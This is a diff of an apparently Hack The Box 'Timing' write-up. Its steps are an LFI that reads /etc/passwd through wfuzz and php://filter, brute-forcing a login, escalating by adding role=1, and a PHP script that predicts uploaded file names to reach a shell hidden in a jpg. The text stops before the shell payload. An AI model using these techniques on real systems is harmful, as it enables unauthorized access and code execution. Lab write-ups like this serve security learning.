@@ -7,7 +7,10 @@
 
 2-source code rewiew (php)
 
-2-File upload 
+2-Unrestricted File Upload
+
+3-Symbolic link
+
 
 
 
@@ -44,7 +47,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## user flag
 
 so lets first try `sql injection` but not work so lets explore directories i prefere `dirsearch` tool
-```
+``` try 
 [13:38:41] 200 -    0B  - /image.php
 [13:38:48] 200 -    5KB - /login.php
 
@@ -52,6 +55,10 @@ so lets first try `sql injection` but not work so lets explore directories i pre
 
 `image.php`
 i used `WFUZZ` to find any paramters and i found `img` parameter.
+`wfuzz -w anyworldist -hh 0 http://timing.htb/image.php?FUZZ=../etc/passwd`
+
+#### note :
+to find `img` parameter i want to make application tell that me  right, you trying to hack me.
 
 another tools :
 ```
@@ -68,6 +75,9 @@ using LFI / RFI using PHP wrappers
 
 
 finally i found its LFI, i used `php://filter/convert.base64-encode` LFI technique to get `etc/passwd`
+
+you can find ways to detect `LFI` here
+[here](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
 
 ![3](https://user-images.githubusercontent.com/36403473/170888290-c9328511-d71a-4377-986a-7306fb7d866c.png)
 
@@ -232,9 +242,10 @@ if (isset($_GET['login'])) {
 }
 
 ```
-from the first look this code seems to have `sql injection` but after search with my friend `Yasser Elsnbary` he found that its not sql injection 
+from the first look this code seems to have `sql injection` but after search with my friend `Yasser Elsnbary` we found that its not sql injection
 
-[php_mysql_prepared_statements.asp]('https://stackoverflow.com/questions/14589407/what-does-a-colon-before-a-literal-in-an-sql-statement-mean')
+you can check it from
+[here](https://stackoverflow.com/questions/14589407/what-does-a-colon-before-a-literal-in-an-sql-statement-mean)
 
 
 ```
@@ -242,6 +253,284 @@ Prepared statements are very useful against SQL injections, because parameter va
 
 ```
 
+its seem that we have user that have high privilege over other users it may admin user but first we need to login.
+
+i only have a user `aaron` but i dont have his passowrd and no way to `sql_injection`
+
+i found this passowrd `4_V3Ry_l0000n9_p422w0rd` in `db_conn.php` but doesn't work.
+
+so the last solution to find `aaron` password is to bruteforce we may found it.
+using `rockyou` wordlist it was easy to find 
+so our username& password  [`aaron`-`aaron`]
+
+![5](https://user-images.githubusercontent.com/36403473/171068633-de00d6bd-5466-485d-b70b-5f9ec013b3f9.png)
+
+After login i realized that i am in right corner i am user 2 so i need to increase my privilege.
+
+lets open `burpsuite`
+
+in `Edit profile` page 
+
+![6](https://user-images.githubusercontent.com/36403473/171068968-87e29291-36cd-4f65-a3b6-774f828eb612.png)
+so lets try to manipulate this 
+
+From `admin_auth_check.php` 
+```
+include_once "auth_check.php";
+
+if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
+    echo "No permission to access this panel!";
+    header('Location: ./index.php');
+    die();
+}
+```
+by checking for `role=1`,so let's add role parameter and see what will happen
+
+![7](https://user-images.githubusercontent.com/36403473/171070042-beb3d3ca-b809-4668-ae81-5c843ee5f252.png)
+
+role parameter changed in `json response` & admin panel tab appeared
+![8](https://user-images.githubusercontent.com/36403473/171071990-835005a6-117c-4272-aeeb-83af822d8397.png)
+
+lets check `avatar_uploader.php` code
+
+```
+<?php
+
+include_once "header.php";
+
+include_once "admin_auth_check.php";
+?>
+
+<script src="js/avatar_uploader.js"></script>
+
+<style>
+    .bg {
+        padding: 30px;
+        /* Full height */
+        height: 100%;
+
+        /* Center and scale the image nicely */
+        background-position: center;
+        background-repeat: no-repeat;
+        background-size: cover;
+    }
+</style>
+
+<div class="bg" id="main">
+
+    <div class="alert alert-success" id="alert-uploaded-success" style="display: none">
+
+    </div>
+
+    <div class="alert alert-danger" id="alert-uploaded-error" style="display: none">
+
+    </div>
+
+    <div class="container bootstrap snippets bootdey" style="margin-bottom: 150px">
+        <h1 class="text-primary"><span class="glyphicon glyphicon-user"></span>Upload avatar</h1>
+        <hr>
 
 
+        <form class="form-inline" action="upload.php" method="post" enctype="multipart/form-data">
+            <div class="form-group mb-2">
+                <input type="file" name="fileToUpload" class="form-control" id="fileToUpload">
+            </div>
 
+            <button type="button" onclick="doUpload()" class="btn btn-primary">
+                Upload Image
+            </button>
+
+        </form>
+
+    </div>
+</div>
+
+<?php
+include_once "footer.php";
+?>
+
+```
+avatar_uploader.js:
+```
+$(document).ready(function () {
+    document.getElementById("main").style.backgroundImage = "url('/image.php?img=images/background.jpg'"
+});
+
+function doUpload() {
+
+    if (document.getElementById("fileToUpload").files.length == 0) {
+        document.getElementById("alert-uploaded-error").style.display = "block"
+        document.getElementById("alert-uploaded-success").style.display = "none"
+        document.getElementById("alert-uploaded-error").textContent = "No file selected!"
+    } else {
+
+        let file = document.getElementById("fileToUpload").files[0];  // file from input
+        let xmlHttpRequest = new XMLHttpRequest();
+        xmlHttpRequest.onreadystatechange = function () {
+            if (xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200) {
+
+
+                if (xmlHttpRequest.responseText.includes("Error:")) {
+                    document.getElementById("alert-uploaded-error").style.display = "block"
+                    document.getElementById("alert-uploaded-success").style.display = "none"
+                    document.getElementById("alert-uploaded-error").textContent = xmlHttpRequest.responseText;
+                } else {
+                    document.getElementById("alert-uploaded-error").style.display = "none"
+                    document.getElementById("alert-uploaded-success").textContent = xmlHttpRequest.responseText;
+                    document.getElementById("alert-uploaded-success").style.display = "block"
+                }
+
+            }
+        };
+        let formData = new FormData();
+
+        formData.append("fileToUpload", file);
+        xmlHttpRequest.open("POST", 'upload.php');
+        xmlHttpRequest.send(formData);
+    }
+}
+
+```
+upload.php
+```
+<?php
+#include("admin_auth_check.php");
+
+$upload_dir = "images/uploads/";
+
+if (!file_exists($upload_dir)) {
+    mkdir($upload_dir, 0777, true);
+}
+
+$file_hash = uniqid();
+
+$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
+$target_file = $upload_dir . $file_name;
+$error = "";
+$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+
+if (isset($_POST["submit"])) {
+    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+    if ($check === false) {
+        $error = "Invalid file";
+    }
+}
+
+// Check if file already exists
+if (file_exists($target_file)) {
+    $error = "Sorry, file already exists.";
+}
+
+if ($imageFileType != "jpg") {
+    $error = "This extension is not allowed.";
+}
+
+if (empty($error)) {
+    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+        echo "The file has been uploaded.";
+    } else {
+        echo "Error: There was an error uploading your file.";
+    }
+} else {
+    echo "Error: " . $error;
+}
+?>
+
+```
+#### analyzing(`upload.php`):
+
+1- we can upload `jpg` file 
+
+2-upload_dir = `"images/uploads/"`
+
+3-this code change the name of photo from this lines 
+```
+$file_hash = uniqid()
+md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"])
+```
+
+so we need to create simple script that change name like this sequence :
+
+`md5(uniqid()+time())+filename`
+
+note that
+
+uniqid()-> generates a unique ID based on the microtime (the current time in microseconds).
+
+The generated ID from this function does not guarantee uniqueness of the return value
+
+time() -> function returns the current time in the number of seconds since the Unix Epoch (January 1 1970 00:00:00 GMT).
+
+so the problem that the new name of photo can be detected.
+
+
+i genetate php code that help me to detect:
+
+```
+<?PHP
+#!/usr/bin/php
+function uniqid_Test()
+{
+	$i=0;
+	while ($i<80)
+	{
+		$hash_name=uniqid(); // return time in microsecond in hex format 
+		//convert (hash_name ) to decimal value
+		$Decimal_value =hexdec($hash_name); 
+		$time_seconds=$Decimal_value*0.000001;
+
+		#echo "uniqid (microseconds) = ".$hash_name."\n";
+
+		#echo "(uniqid)-> Decimal value (microseconds)= ".$Decimal_value."\n";
+
+		#echo "(uniqid)-> Decimal value (Seconds) = ".$time_seconds."\n";
+		
+		// from second to microsecond 
+		$converted_id=($time_seconds+$i)/0.000001;
+		
+		$converted_id_hex=dechex($converted_id);
+
+		echo date("D M j G:i:s T Y") ." -> ". md5($converted_id_hex.time())."\n";
+
+		sleep(1);
+
+		$i=$i+1;
+	}
+
+}
+function time_Test()
+{ 
+	while (true)
+	{
+		echo date("G:i:s")." -> ".md5(uniqid().time())."pts.jpg"."\n";
+
+		sleep(1);
+	
+	}
+
+
+}
+
+#uniqid_Test()
+#time_Test()
+
+	while (true)
+	{
+		echo date("G:i:s")." -> ". md5(uniqid().time()) . '_'. "pk.jpg";
+		sleep(1);
+		echo "\n";
+
+		
+	
+	}
+
+?>
+```
+so lets upload our shell file and run our script.
+
+to create php shell inside `jpg` file 
+
+Unrestricted File Upload:
+
+
+ 
